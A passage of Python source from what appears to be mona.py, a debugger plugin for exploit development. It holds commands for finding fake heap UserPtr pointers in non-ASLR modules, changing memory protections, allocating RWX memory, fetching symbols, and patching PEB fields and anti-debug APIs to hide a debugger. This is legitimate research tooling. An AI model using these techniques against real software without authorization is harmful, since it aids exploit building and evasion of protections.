			processpage = True
			# don't even bother if page belongs to module that is ASLR/Rebased
			pageptr = MnPointer(page_base)
			thismodulename = pageptr.belongsTo()
			if thismodulename != "":
				thismod = MnModule(thismodulename)
				if thismod.isAslr or thismod.isRebase:
					processpage = False
			if processpage:
				dbg.log("[+] Walking page 0x%08x - 0x%08x (%s)" % (page_base,page_end,acl))
				startptr = page_base  # we need to start here
				while startptr < page_end-16:
					# pointer needs to pass 3 tests
					try:
						heap_entry = startptr
						userptr = heap_entry + 0x8
						cookieptr = heap_entry + 5
						raw_heapcookie = dbg.readMemory(cookieptr,1)
						heapcookie = struct.unpack("<B",raw_heapcookie)[0]

						hexptr1 = "%08x" % userptr
						hexptr2 = "%08x" % heapcookie 

						a1 = hexStrToInt(hexptr1[6:])
						a2 = hexStrToInt(hexptr2[6:])

						test1 = False
						test2 = False
						test3 = False

						if (a1 & 7) == 0:
							test1 = True
						if (a2 & 1) == 1:
							test2 = True
						if (a2 & 8) == 8:
							test3 = True

						if test1 and test2 and test3:
							cookiemonsters.append(startptr+0x8)
					except:
						pass
					startptr += 1
	dbg.log("")
	if len(cookiemonsters) > 0:
		# write to log
		dbg.log("Found %s (fake) UserPtr pointers." % len(cookiemonsters))
		all_ptrs = {}
		all_ptrs[""] = cookiemonsters
		logfile = MnLog(filename)
		thislog = logfile.reset()
		processResults(all_ptrs,logfile,thislog)
	else:
		dbg.log("Bad luck, no results.")			
	return

def procFlags(args):
	currentflag = getNtGlobalFlag()
	dbg.log("[+] NtGlobalFlag: 0x%08x" % currentflag)
	flagvalues = getNtGlobalFlagValues(currentflag)
	if len(flagvalues) == 0:
		dbg.log("    No GFlags set")
	else:
		for flagvalue in flagvalues:
			dbg.log("    0x%08x : %s" % (flagvalue,getNtGlobalFlagValueName(flagvalue)))
	return

def procEval(args):
	# put all args together
	argline = ""
	if len(currentArgs) > 1:
		if __DEBUGGERAPP__ == "WinDBG":
			for a in currentArgs[2:]:
				argline += a
		else:
			for a in currentArgs[1:]:
				argline += a 
		argline = argline.replace(" ","")
	if argline.replace(" ","") != "":
		dbg.log("[+] Evaluating expression '%s'" % argline)
		val,valok = getAddyArg(argline)
		if valok:
			dbg.log("    Result: 0x%08x" % val)
		else:
			dbg.log("    *** Unable to evaluate expression ***")
	else:
		dbg.log("    *** No expression found***")	
	return

def procSym(args):
	"""Manage symbols: list status, fetch from server, or clean cache. WinDBG only."""

	if __DEBUGGERAPP__ != "WinDBG":
		dbg.log("*** Sorry, command 'sym' is not supported in %s ***" % __DEBUGGERAPP__, highlight=1)
		return

	# Require at least one valid filesystem cache directory
	cache_dirs = _ensureSymbolCache(auto_fix=False)
	if not cache_dirs:
		return

	if "l" in args or "list" in args:
		_sym_list(args)
	elif "f" in args or "fetch" in args:
		_sym_load(args)
	elif "c" in args or "clean" in args:
		_sym_clean(args)
	else:
		dbg.log("[!] Usage: !mona sym -list | -fetch | -clean")
		dbg.log("    -l / -list   : Show symbol availability for all modules")
		dbg.log("    -f / -fetch  : Download symbols from symbol server")
		dbg.log("    -c / -clean  : Remove .error files from symbol cache folders")

def _sym_list(args):
	modulecriteria = {}
	criteria = {}
	modulecriteria, criteria = args2criteria(args, modulecriteria, criteria)

	sort_keys = []
	if "sort" in args and args["sort"]:
		sort_keys, err = _parse_sort_spec(str(args["sort"]).strip())
		if err:
			dbg.log("[!] Invalid -sort value: %s" % err)
			return
	if not sort_keys:
		sort_keys = [("base", False)]

	modulestosearch = getModulesToQuery(modulecriteria, from_memory=True)

	cache_dirs, servers, sym_entries = dbglib.getSymPaths()
	cache_dirs = [d for d in cache_dirs if d and not d.lower().startswith(("http://", "https://"))]

	filtertext = criteriaToText(modulecriteria, True)
	if filtertext:
		dbg.log("[+] Filter: %s" % filtertext)
	dbg.log("[+] Total modules: %d | After filters: %d" % (len(mnproc.g_modules), len(modulestosearch)))
	dbg.log("")

	# Symbol path table — only show entries with a valid filesystem cache
	sympath_data = {}
	sympath_order = []
	for i, e in enumerate(sym_entries):
		ec = e["cache"] or ""
		if ec and not ec.lower().startswith(("http://", "https://")):
			key = i + 1
			sympath_data[key] = (ec, e["server"] or "(local only)")
			sympath_order.append(key)

	print_dict_table(
		sympath_data,
		["#", "Cache", "Server"],
		["int", "string", "string"],
		itemsequence=sympath_order,
		padding="    ",
	)
	dbg.log("")

	# Sort
	_POST_SORT_FIELDS = {k: v["key"] for k, v in MODULE_COLUMNS.items()}
	items = [(k, v) for k, v in mnproc.g_modules.items() if v["name"] in modulestosearch]
	for key, reverse in reversed(sort_keys):
		if key in _POST_SORT_FIELDS:
			items = sorted(items, key=_POST_SORT_FIELDS[key], reverse=reverse)

	# Build data dict for print_dict_table
	table_data = {}
	row_order = []
	found_count = 0
	missing_count = 0

	for modkey, modprops in items:
		base = modprops["base"]
		modname = str(modprops["filename"] or modprops["name"])
		pdbname = modprops.get("pdbname", "")
		guidage = modprops.get("pdbguidage", "")

		if not pdbname or not guidage:
			table_data[base] = (modname, "(no PDB info)", "N/A", "", "")
			missing_count += 1
		else:
			pdb_path, label = _findSymbolsCached(modprops, cache_dirs)
			if pdb_path:
				try:
					pdb_size = "0x%x" % os.path.getsize(pdb_path)
				except:
					pdb_size = "?"
				table_data[base] = (modname, pdbname, "Yes (%s)" % label, pdb_size, pdb_path)
				found_count += 1
			else:
				table_data[base] = (modname, pdbname, "No", "", "")
				missing_count += 1
		row_order.append(base)

	print_dict_table(
		table_data,
		["Base", "Module", "PDB", "Cached", "Size", "Path"],
		["pointer", "string", "string", "string", "string", "string"],
		itemsequence=row_order,
		padding="    ",
	)

	dbg.log("")
	dbg.log("[+] Cached: %d | Missing: %d | Total: %d" % (found_count, missing_count, found_count + missing_count))

def _http_fetch_symbol(pdbname, guidage, cache_dir, servers):
	"""Download a PDB from a symbol server via HTTP.

	Tries each server URL with the standard SymSrv path layout:
	  <server>/<pdbname>/<guidage>/<pdbname>

	Parameters:
		pdbname   : str -- PDB filename (e.g. 'wkernel32.pdb')
		guidage   : str -- GUID+Age string
		cache_dir : str -- local directory to save the PDB into
		servers   : list of str -- symbol server URLs to try

	Returns:
		(success, local_path, message) tuple.
	"""
	if not pdbname or not guidage or not cache_dir:
		return False, "", "pdbname, guidage, and cache_dir are all required"

	if PY3:
		from urllib.request import urlopen, Request
		from urllib.error import URLError, HTTPError
	else:
		from urllib2 import urlopen, Request, URLError, HTTPError

	dest_dir = os.path.join(cache_dir, pdbname, guidage)
	dest_path = os.path.join(dest_dir, pdbname)

	if os.path.isfile(dest_path):
		return True, dest_path, "Already cached"

	for server in servers:
		server = server.rstrip("/")
		url = "%s/%s/%s/%s" % (server, pdbname, guidage, pdbname)
		dbg.log("    [*] Trying %s" % url)
		try:
			req = Request(url)
			req.add_header("User-Agent", "Microsoft-Symbol-Server/10.0.0.0")
			resp = urlopen(req, timeout=15)
			data = resp.read()
			if len(data) == 0:
				continue
			if not os.path.isdir(dest_dir):
				os.makedirs(dest_dir)
			with open(dest_path, "wb") as f:
				f.write(data)
			return True, dest_path, "Downloaded from %s" % server
		except HTTPError as e:
			dbg.log("    [*] HTTP %d" % e.code)
			continue
		except (URLError, Exception) as e:
			dbg.log("    [*] %s" % str(e))
			continue

	return False, "", "Not found on any server"

def _sym_load(args):
	modulecriteria = {}
	criteria = {}
	modulecriteria, criteria = args2criteria(args, modulecriteria, criteria)

	modulestosearch = getModulesToQuery(modulecriteria, from_memory=True)

	cache_dirs, servers, sym_entries = dbglib.getSymPaths()
	cache_dirs = [d for d in cache_dirs if d and not d.lower().startswith(("http://", "https://"))]

	# Parse -s for specific server/cache index
	server_idx = None
	if "s" in args:
		try:
			server_idx = int(args["s"])
			if server_idx < 1 or server_idx > len(sym_entries):
				dbg.log("[!] Invalid server index %d. Valid range: 1-%d" % (server_idx, len(sym_entries)))
				return
		except (ValueError, TypeError):
			dbg.log("[!] -s requires a numeric server index (1-%d)" % len(sym_entries))
			return

	# Determine which servers and cache dir to use for HTTP download
	use_http = "force" in args
	if server_idx is not None:
		entry = sym_entries[server_idx - 1]
		http_servers = [entry["server"]] if entry["server"] else []
		ec = entry["cache"] if entry["cache"] and not entry["cache"].lower().startswith(("http://", "https://")) else ""
		http_cache = ec if ec else (cache_dirs[0] if cache_dirs else None)
	else:
		http_servers = list(servers)
		http_cache = cache_dirs[0] if cache_dirs else None

	if use_http and not http_servers:
		dbg.log("[!] No symbol server URLs found in sympath for HTTP download")
		return
	if use_http and not http_cache:
		dbg.log("[!] No cache directory found in sympath to save symbols")
		return

	if use_http:
		dbg.log("[+] Using direct HTTP download (-force)")

	filtertext = criteriaToText(modulecriteria, True)
	if filtertext:
		dbg.log("[+] Filter: %s" % filtertext)

	# Gather modules that are missing symbols
	modules_to_load = []
	for modkey, modprops in mnproc.g_modules.items():
		if modprops["name"] not in modulestosearch:
			continue
		pdbname = modprops.get("pdbname", "")
		guidage = modprops.get("pdbguidage", "")
		if not pdbname or not guidage:
			continue
		# Check if already cached
		already_cached = False
		for cdir in cache_dirs:
			candidate = os.path.join(cdir, pdbname, guidage, pdbname)
			if os.path.isfile(candidate):
				already_cached = True
				break
		if not already_cached:
			modules_to_load.append((modkey, modprops))

	if not modules_to_load:
		dbg.log("[+] All symbols are already cached")
		return

	dbg.log("[+] Attempting to load symbols for %d module(s)" % len(modules_to_load))

	# If specific server requested, temporarily change sympath for .reload
	saved_sympath = None
	if server_idx is not None:
		entry = sym_entries[server_idx - 1]
		dbg.log("[+] Using server #%d: %s" % (server_idx, entry["raw"]))
		saved_sympath = dbglib.getSymbolPath()
		dbglib.setSymbolPath(entry["raw"])

	loaded = 0
	failed = 0
	try:
		for modkey, modprops in modules_to_load:
			modname = str(modprops["filename"] or modprops["name"])
			pdbname = modprops.get("pdbname", "")
			guidage = modprops.get("pdbguidage", "")
			reload_name = os.path.splitext(modname)[0]

			dbg.log("[*] Loading symbols for %s (%s)..." % (modname, pdbname))

			if use_http:
				# Direct HTTP download
				success, local_path, message = _http_fetch_symbol(
					pdbname, guidage, http_cache, http_servers)
			else:
				# WinDBG .reload /f
				success, local_path, message = dbglib.fetchSymbol(
					reload_name, pdbname, guidage)

			if success:
				loaded += 1
				dbg.log("    [+] %s" % message)
				if local_path:
					size_str = ""
					try:
						size_str = " (0x%x)" % os.path.getsize(local_path)
					except:
						pass
					dbg.log("    [+] %s%s" % (local_path, size_str))
			else:
				failed += 1
				dbg.log("    [-] %s" % message)
	finally:
		# Restore sympath if we changed it
		if saved_sympath is not None:
			dbglib.setSymbolPath(saved_sympath)
			dbg.log("[+] Symbol path restored")

	dbg.log("")
	dbg.log("[+] Loaded: %d | Failed: %d | Total: %d" % (loaded, failed, loaded + failed))

def _sym_clean(args):
	folders_to_clean = []
	seen_folders = set()

	if "p" in args:
		if type(args["p"]).__name__.lower() != "bool":
			folders_to_clean.append(args["p"])

	if len(folders_to_clean) == 0:
		cache_dirs, servers, sym_entries = dbglib.getSymPaths()
		for cdir in cache_dirs:
			ckey = cdir.lower()
			if ckey not in seen_folders:
				seen_folders.add(ckey)
				folders_to_clean.append(cdir)

	dbg.log("[+] Found %d unique folder(s) to inspect" % len(folders_to_clean))
	for thisfolder in folders_to_clean:
		dbg.log("    %s" % thisfolder)
	dbg.log("")

	deleted_files = []
	total_recovered = 0

	for basefolder in folders_to_clean:
		if not os.path.isdir(basefolder):
			dbg.log("[-] Folder does not exist: %s" % basefolder)
			continue

		dbg.log("[+] Scanning folder: %s" % basefolder)

		for root, dirs, files in os.walk(basefolder):
			for filename in files:
				if filename.lower().endswith(".error"):
					fullpath = os.path.join(root, filename)
					try:
						filesize = os.path.getsize(fullpath)
					except:
						filesize = 0

					try:
						os.remove(fullpath)
						deleted_files.append((fullpath, filesize))
						total_recovered += filesize
						dbg.log("[+] Deleted: %s (%.2f Mb)" % (fullpath, float(filesize) / (1024.0 * 1024.0)))
					except Exception as e:
						dbg.log("[-] Failed to delete %s : %s" % (fullpath, str(e)))

	dbg.log("")
	dbg.log("=" * 60)
	if len(deleted_files) == 0:
		dbg.log("[+] No .error files were found/deleted")
	else:
		dbg.log("[+] Deleted %d .error file(s):" % len(deleted_files))
		for fullpath, filesize in deleted_files:
			dbg.log("    %s --> %.2f Mb" % (fullpath, float(filesize) / (1024.0 * 1024.0)))
		dbg.log("[+] Total space recovered: %.2f Mb" % (float(total_recovered) / (1024.0 * 1024.0)))
	
	dbg.log("=" * 60)

def procChangeACL(args):
	size = 1
	addy = 0
	acl = ""
	addyerror = False
	aclerror = False
	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			addy,addyok = getAddyArg(args["a"])
			if not addyok:
				addyerror = True
	else:
		addyerror = True
	if "acl" in args:
		if type(args["acl"]).__name__.lower() != "bool":
			if args["acl"].upper() in MnProc.memProtConstants:
				acl = args["acl"].upper()
			else:
				aclerror = True
	else:
		aclerror = True	
	
	if addyerror:
		dbg.log(" *** Please specify a valid address to argument -a ***")

	if aclerror:
		dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
		dbg.log(" *** Valid values are :")
		for acltype in MnProc.memProtConstants:
			dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),MnProc.memProtConstants[acltype][0],MnProc.memProtConstants[acltype][1]))

	if not addyerror and not aclerror:
		pageacl = MnProc.memProtConstants[acl][1]
		pageaclname = MnProc.memProtConstants[acl][0]
		modifier_only_acl_vals = [0x100, 0x200, 0x400]
		base_acl_mask = 0xff
		dbg.log("[+] ACL Changes for address %s" % (PTR_PRINT % addy))
		current_acl = dbg.getMemoryPageByAddress(addy).getAccess()
		before_access = getPointerAccess(addy, forcedread = True)
		dbg.log("[+] Current ACL: %s" % before_access)
		if pageacl in modifier_only_acl_vals:
			base_acl = current_acl & base_acl_mask
			if base_acl == 0:
				base_acl = 0x1
			pageacl = base_acl | pageacl
			dbg.log("[+] Desired ACL: %s (effective 0x%02x)" % (pageaclname,pageacl))
		else:
			dbg.log("[+] Desired ACL: %s (0x%02x)" % (pageaclname,pageacl))
		if current_acl != pageacl:
			#retval = dbg.rVirtualAlloc(addy,1,0x1000,pageacl)
			retval = dbg.rVirtualProtect(addy,1,pageacl)
			after_access = getPointerAccess(addy, forcedread = True)
			dbg.log("[+] ACL after changing: %s" % after_access)
			report_txt = "ACL changed successfully"
			if before_access == after_access:
				report_txt = "!! Failed to change ACL. VirtualProtect returned %s" % (retval) 
			dbg.log("[+] %s" % report_txt)
		else:
			dbg.log("[+] No changes needed")
	return

def procToBp(args):
	"""
	Generate WinDBG syntax to create a logging breakpoint on a given location
	"""
	dbgp(get_current_function_name())
	addy = 0
	addyerror = False
	executenow = False
	locsyntax = ""
	regsyntax = ""
	poisyntax = ""
	dmpsyntax = ""
	instructionparts = []
	global silent
	oldsilent = silent
	regnames = Registers32BitsOrder[:]
	if arch == 64:
		# add 64bit regs as well
		regnames = Registers64BitsOrder[:] + Registers32BitsOrder[:]
	dbgp("Regs used: %s" % regnames)
	regs = getRegisters()
	silent = True
	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			addy,addyok = getAddyArg(args["a"])
			if not addyok:
				addyerror = True
	else:
		if arch == 32:
			addy = regs["eip"]
		else:
			addy = regs["rip"]

	if "e" in args:
		executenow = True

	if addyerror:
		dbg.log(" *** Please provide a valid address with argument -a ***",highlight=1)
		return

	# get RVA for addy (or absolute address if addy is not part of a module)
	bpdest = "0x%08x" % addy
	instruction = ""
	ptrx = MnPointer(addy)
	modname = ptrx.belongsTo()
	if not modname == "":
		mod = MnModule(modname)
		m = mod.moduleBase
		rva = addy - m
		bpdest = "%s+0x%02x" % (modname,rva)
		thisopcode = dbg.disasm(addy)
		instruction = getDisasmInstruction(thisopcode)

	locsyntax = "bp %s" % bpdest

	instructionparts = multiSplit(instruction,[" ",","])

	usedregs = []
	
	for reg in regnames:
		for ipart in instructionparts:
			if reg.lower() in ipart.lower():
				usedregs.append(reg)

	if len(usedregs) > 0:
		regsyntax = '.printf \\"'
		argsyntax = ""
		
		for ipart in instructionparts:
			for reg in regnames:
				if reg.lower() in ipart.lower():

					if "[" in ipart:
						regsyntax += ipart.replace("[","").replace("]","")
						regsyntax += ": 0x%p, "

						argsyntax += "%s," % ipart.replace("[","").replace("]","")

						regsyntax += ipart
						regsyntax += ": 0x%p, "								

						argsyntax += "%s," % ipart.replace("[","poi(").replace("]",")")
						
						iparttxt = ipart.replace("[","").replace("]","")
						dmpsyntax += ".echo;.echo %s:;dps %s L 0x24/4;" % (iparttxt,iparttxt)
					else:
						regsyntax += ipart
						regsyntax += ": 0x%p, "								
						argsyntax += "%s," % ipart 
		argsyntax = argsyntax.strip(",")
		regsyntax = regsyntax.strip(", ")
		regsyntax += '\\",%s;' % argsyntax

	if "call" in instruction.lower():
		if arch == 32:
			dmpsyntax += '.echo;.printf \\"Stack (esp: 0x%p):\\",esp;.echo;dps esp L 0x4;'
		if arch == 64:
			dmpsyntax += '.echo;.printf \\"rcx: 0x%p, rdx: 0x%p, r8: 0x%p, r9: 0x%p\\", @rcx, @rdx, @r8, @rc9;'

	if instruction.lower().startswith("ret"):
		if arch == 32:
			dmpsyntax += '.echo;.printf \\"EAX: 0x%p, Ret To: 0x%p, Arg1: 0x%p, Arg2: 0x%p, Arg3: 0x%p, Arg4: 0x%p\\",eax,poi(esp),poi(esp+4),poi(esp+8),poi(esp+c),poi(esp+10);'
		if arch == 64:
			dmpsyntax += '.echo;.printf \\"RAX: 0x%p, Ret To: 0x%p\\",rax,poi(rsp);'


	bpsyntax = locsyntax + ' ".echo ---------------;u @$ip L 1;' + regsyntax + dmpsyntax + ".echo;g" + '"'
	filename = "logbps.txt"
	logfile = MnLog(filename)
	thislog = logfile.reset(clear = False,showheader=False,skipModuleTable=True)
	with open(thislog, "a") as fh:
		fh.write(bpsyntax + "\n")
	silent = oldsilent
	dbg.log("%s" % bpsyntax)
	dbg.log("Updated %s" % thislog)
	if executenow:
		dbg.nativeCommand(bpsyntax)
		dbg.log("> Breakpoint set at 0x%08x" % addy)
	return

def procAllocMem(args):
	size = 0x1000
	addy = 0
	sizeerror = False
	addyerror = False
	byteerror = False
	fillup = False
	writemore = False
	fillbyte = "A"
	acl = "RWX"

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			sval = args["s"]
			if sval.lower().startswith("0x"):
				try:
					size = int(sval,16)
				except:
					sizeerror = True
			else:
				try:
					size = int(sval)
				except:
					sizeerror = True
		else:
			sizeerror = True

	if "b" in args:
		if type(args["b"]).__name__.lower() != "bool":
			try:
				fillbyte = hex2bin(args["b"])				
				fillbyte = fillbyte[:1]
			except:
				dbg.log(" *** Invalid byte specified with -b ***")
				byteerror = True

	if size < 0x1:
		sizeerror = True
		dbg.log(" *** Minimum size is 0x1 bytes ***",highlight=1)

	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			addy,addyok = getAddyArg(args["a"])
			if not addyok:
				addyerror = True

	if "fill" in args:
		fillup = True
		if "force" in args:
			writemore = True

	aclerror = False
	if "acl" in args:
		if type(args["acl"]).__name__.lower() != "bool":
			if args["acl"].upper() in MnProc.memProtConstants:
				acl = args["acl"].upper()
			else:
				aclerror = True
				dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
				dbg.log(" *** Valid values are :")
				for acltype in MnProc.memProtConstants:
					dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),MnProc.memProtConstants[acltype][0],MnProc.memProtConstants[acltype][1]))

	if addyerror:
		dbg.log(" *** Please specify a valid address with -a ***",highlight=1)

	if sizeerror:
		dbg.log(" *** Please specify a valid size with -s ***",highlight = 1)
	
	if not addyerror and not sizeerror and not byteerror and not aclerror:
		dbg.log("[+] Requested allocation size: 0x%08x (%d) bytes" % (size,size))
		if addy > 0:
			dbg.log("[+] Desired target location : 0x%08x" % addy)
		pageacl = MnProc.memProtConstants[acl][1]
		pageaclname = MnProc.memProtConstants[acl][0]
		if addy > 0:
			dbg.log("    Current page ACL: %s" % getPointerAccess(addy))
		dbg.log("    Desired page ACL: %s (0x%02x)" % (pageaclname,pageacl))
		VIRTUAL_MEM = ( 0x1000 | 0x2000 )
		allocat = dbg.rVirtualAlloc(addy,size,VIRTUAL_MEM,pageacl)
		if allocat == 0:
			dbg.log("[!] VirtualAllocEx failed (size=0x%x, acl=%s)." % (size, pageaclname), highlight=1)
			if addy > 0:
				dbg.log("    Trying VirtualProtectEx on existing mapping at 0x%08x" % addy)
				retval = dbg.rVirtualProtect(addy,size,pageacl)
				if retval == 0:
					dbg.log("[!] VirtualProtectEx failed at 0x%08x" % addy, highlight=1)
				else:
					dbg.log("[+] Changed ACL at 0x%08x to %s" % (addy, pageaclname))
			return

		retval = dbg.rVirtualProtect(allocat,size,pageacl)
		if retval == 0:
			dbg.log("[!] VirtualProtectEx failed at %s" % (PTR_PRINT % allocat), highlight=1)
		else:
			dbg.log("[+] Allocated memory at %s" % (PTR_PRINT % allocat))
		#if allocat > 0:
		#	dbg.log("    ACL 0x%08x: %s" % (allocat,getPointerAccess(allocat)))
		#else:
		#	dbg.log("    ACL 0x%08x: %s" % (addy,getPointerAccess(addy)))

		if allocat == 0 and fillup and not writemore:
			dbg.log("[+] It looks like the page was already mapped. Use the -force argument")
			dbg.log("    to make me write to %s anyway" % (PTR_PRINT % addy))
		if (allocat > 0 and fillup) or (writemore and fillup):
			loc = 0
			written = 0
			towrite = size
			addy = allocat
			while loc < towrite:
				try:
					dbg.writeMemory(addy+loc,_to_bytes(fillbyte))
					written += 1
				except Exception as e:
					dbg.log("    Error writing \\x%s to %s: %s" % (bin2hex(fillbyte), PTR_PRINT % addy, str(e)))
					pass
				loc += 1
			dbg.log("[+] Wrote %d times \\x%s to chunk at %s" % (written,bin2hex(fillbyte),PTR_PRINT % addy))
	return

def procHideDebug(args): #bananas bananas
	peb = MnPEB.get_address()
	dbg.log("[+] Patching PEB (0x%08x)" % peb)
	if peb == 0:
		dbg.log("** Unable to find PEB **")
		return

	isdebugged = struct.unpack('<B',dbg.readMemory(peb + 0x02,1))[0]
	processheapflag = dbg.readLong(peb + 0x18)
	processheapflag += 0x10
	processheapvalue = dbg.readLong(processheapflag)
	ntglobalflag = dbg.readLong(peb + 0x68)

	dbg.log("    Patching PEB.IsDebugged       : 0x%x -> 0x%x" % (isdebugged,0))
	dbg.writeMemory(peb + 0x02, '\x00')
	
	dbg.log("    Patching PEB.ProcessHeap.Flag : 0x%x -> 0x%x" % (processheapvalue,0))
	dbg.writeLong(processheapflag,0)
	
	dbg.log("    Patching PEB.NtGlobalFlag     : 0x%x -> 0x%x" % (ntglobalflag,0))
	dbg.writeLong(peb + 0x68, 0)
	
	dbg.log("    Patching PEB.LDR_DATA Fill pattern")
	a = dbg.readLong(peb + 0xc)
	while a != 0:
		a += 1
		try:
			b = dbg.readLong(a)
			c = dbg.readLong(a + 4)
			if (b == 0xFEEEFEEE) and (c == 0xFEEEFEEE):
				dbg.writeLong(a,0)
				dbg.writeLong(a + 4,0)
				a += 7
		except:
			break

	uef = dbg.getAddress("kernel32.UnhandledExceptionFilter")
	if uef > 0:
		dbg.log("[+] Patching kernel32.UnhandledExceptionFilter (0x%08x)" % uef)
		uef += 0x86
		dbg.writeMemory(uef, dbg.assemble(" \
			PUSH EDI \
		"))
	else:
		dbg.log("[-] Failed to hook kernel32.UnhandledExceptionFilter (0x%08x)")

	remdebpres = dbg.getAddress("kernel32.CheckRemoteDebuggerPresent")
	if remdebpres > 0:
		dbg.log("[+] Patching CheckRemoteDebuggerPresent (0x%08x)" % remdebpres)
		dbg.writeMemory( remdebpres, dbg.assemble( " \
			MOV   EDI, EDI                                    \n \
			PUSH EBP                                         \n \
			MOV  EBP, ESP                                    \n \
			MOV   EAX, [EBP + C]                              \n \
			PUSH  0                                           \n \
			POP   [EAX]                                       \n \
			XOR   EAX, EAX                                    \n \
			POP   EBP                                         \n \
			RET   8                                           \
		" ) )
	else:
		dbg.log("[-] Unable to patch CheckRemoteDebuggerPresent")

	gtc = dbg.getAddress("kernel32.GetTickCount")
	if gtc > 0:
		dbg.log("[+] Patching GetTickCount (0x%08x)" % gtc)
		patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
		while len(patch) > 0x0F:
			patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
		dbg.writeMemory( gtc, patch )
	else:
		dbg.log("[-] Unable to pach GetTickCount")

	zwq = dbg.getAddress("ntdll.ZwQuerySystemInformation")
	if zwq > 0:
		dbg.log("[+] Patching ZwQuerySystemInformation (0x%08x)" % zwq)
		isPatched = False
		a = 0
		s = 0
		while a < 3:
			a += 1
			s += dbg.disasmSizeOnly(zwq + s).opsize
		FakeCode = dbg.readMemory(zwq, 1) + b"\x78\x56\x34\x12" + dbg.readMemory(zwq + 5, 1)
		if FakeCode == dbg.assemble("PUSH 0x12345678\nRET"):
			isPatched = True
			a = dbg.readLong(zwq+1)
			i = 0
			s = 0
			while i < 3:
				i += 1
				s += dbg.disasmSizeOnly(a+s).opsize

		if isPatched:
			dbg.log("    Function was already patched.")
		else:
			a = dbg.remoteVirtualAlloc(size=0x1000)
			if a > 0:
				dbg.log("    Writing instructions to 0x%08x" % a)
				dbg.writeMemory(a, dbg.readMemory(zwq,s))
				pushCode = dbg.assemble("PUSH 0x%08x" % (zwq + s))
				patchCode = "\x83\x7c\x24\x08\x07"	# CMP [ESP+8],7
				patchCode += "\x74\x06"	
				patchCode += pushCode
				patchCode += "\xC3"					# RETN
				patchCode += "\x8B\x44\x24\x0c"		# MOV EAX,[ESP+0x0c]
				patchCode += "\x6a\x00"				# PUSH 0
				patchCode += "\x8f\x00"				# POP [EAX]
				patchCode += "\x33\xC0"				# XOR EAX,EAX
				patchCode += "\xC2\x14\x00"			# RETN 14
				dbg.writeMemory( a + s, patchCode)
				# redirect function
				dbg.writeMemory( zwq, dbg.assemble( "PUSH 0x%08X\nRET" % a) )

			else:
				dbg.log("    ** Unable to allocate memory in target process **")

	else:
		dbg.log("[-] Unable to patch ZwQuerySystemInformation")

	return			


# Show banner
def getBanner():
	banners = {}
	bannertext = ""
	bannertext += "    +------------------------------------------------------------------+\n"
	bannertext += "    |                         __               __                      |\n"
	bannertext += "    |   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n"
	bannertext += "    |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |\n"
	bannertext += "    | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n"
	bannertext += "    | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |\n"
	bannertext += "    |                                                                  |\n"
	bannertext += "    |     https://www.corelan.be | https://www.corelan-training.com    |\n"
	bannertext += "    |                 https://www.corelan-certified.com                |\n"
	bannertext += "    +------------------------------------------------------------------+\n"
	banners[0] = bannertext

	bannertext = ""
	bannertext += "    /------------------------------------------------------------------\\\n"			
	bannertext += "    |        _ __ ___    ___   _ __    __ _     _ __   _   _           |\n"
	bannertext += "    |       | '_ ` _ \  / _ \ | '_ \  / _` |   | '_ \ | | | |          |\n"
	bannertext += "    |       | | | | | || (_) || | | || (_| | _ | |_) || |_| |          |\n"
	bannertext += "    |       |_| |_| |_| \___/ |_| |_| \__,_|(_)| .__/  \__, |          |\n"
	bannertext += "    |                                          |_|     |___/           |\n"
	bannertext += "    \------------------------------------------------------------------/\n"	
	banners[1] = bannertext

	bannertext = ""
	bannertext += "    #----------------------------------------------------------------- #\n"
	bannertext += "    |                                                                  |\n"
	bannertext += "    |      ____ ___  ____  ____  ____ _                                |\n"
	bannertext += "    |   / __ `__ \/ __ \/ __ \/ __ `/  https://www.corelan.be          |\n"
	bannertext += "    |  / / / / / / /_/ / / / / /_/ /  https://www.corelan-training.com |\n"
	bannertext += "    | /_/ /_/ /_/\____/_/ /_/\__,_/  https://www.corelan-certified.com |\n"
	bannertext += "    |                                                                  |\n"
	bannertext += "    #------------------------------------------------------------------#\n"
	banners[2] = bannertext

	bannertext = ""
	bannertext += "\n    .##.....##..#######..##....##....###........########..##....##\n"
	bannertext += "    .###...###.##.....##.###...##...##.##.......##.....##..##..##.\n"
	bannertext += "    .####.####.##.....##.####..##..##...##......##.....##...####..\n"
	bannertext += "    .##.###.##.##.....##.##.##.##.##.....##.....########.....##...\n"
	bannertext += "    .##.....##.##.....##.##..####.#########.....##...........##...\n"
	bannertext += "    .##.....##.##.....##.##...###.##.....##.###.##...........##...\n"
	bannertext += "    .##.....##..#######..##....##.##.....##.###.##...........##...\n\n"
	banners[3] = bannertext

	bannertext = ""
	bannertext += "   ┌───────────────────────────────────────┐\n"
	bannertext += "   │                                       │\n"
	bannertext += "   │    ____               _               │\n"
	bannertext += "   │   / ___|___  _ __ ___| | __ _ _ __    │\n"
	bannertext += "   │  | |   / _ \| '__/ _ \ |/ _` | '_ \   │\n"
	bannertext += "   │  | |__| (_) | | |  __/ | (_| | | | |  │\n"
	bannertext += "   │   \____\___/|_|  \___|_|\__,_|_| |_|  │\n"
	bannertext += "   │                                       │\n"
	bannertext += "   │    www.corelan.be                     │\n"
	bannertext += "   └───────────────────────────────────────┘\n"
	banners[4] = bannertext

	bannertext = """
    ___  ________ _   _   ___          _____ 
    |  \/  |  _  | \ | | / _ \        |____ |
    | .  . | | | |  \| |/ /_\ \ __   __   / /
    | |\/| | | | | . ` ||  _  | \ \ / /   \ \ 
    | |  | \ \_/ / |\  || | | |  \ V /.___/ /
    \_|  |_/\___/\_| \_/\_| |_/   \_/ \____/ 

    www.corelan.be 
    www.corelan-training.com  
    www.corelan-certified.com"""

	banners[5] = bannertext

	bannertext = """
